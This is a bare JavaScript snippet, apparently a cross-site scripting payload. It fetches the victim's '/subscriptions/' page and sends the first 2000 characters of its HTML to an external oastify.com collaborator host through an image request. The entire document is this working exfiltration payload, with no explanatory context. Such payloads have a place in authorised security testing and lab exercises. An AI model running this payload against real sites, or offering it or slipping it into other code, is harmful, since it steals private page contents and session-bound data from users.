fetch('/subscriptions/')
  .then(r => r.text())
  .then(html => {
    var img = new Image();
    img.src = 'https://nc33oyddhrvwqbzd5zuousksqjwak08p.oastify.com/?data=' + encodeURIComponent(html.substring(0, 2000));
  });
